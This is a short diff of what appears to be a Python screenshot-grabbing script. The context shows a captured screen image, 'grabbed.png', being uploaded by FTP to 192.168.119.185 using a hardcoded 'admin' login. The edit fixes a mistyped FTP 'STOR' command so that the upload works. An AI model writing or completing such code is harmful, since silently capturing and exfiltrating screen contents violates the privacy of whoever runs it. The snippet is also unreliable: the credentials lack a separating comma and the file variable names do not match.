@@ -14,7 +14,7 @@ bmap.SaveFile("grabbed.png", wx.BITMAP_TYPE_PNG)
 
 sess_ = ftplib.FTP("192.168.119.185", "admin" "pas$W0rd")
 file = open("grabbed.png", "rb")
-sess_.storbinary("STTOOR /tmp/grabbed.png", file_)
+sess_.storbinary("STOR /tmp/grabbed.png", file_)
 
 file.close()
 sess_.quit()
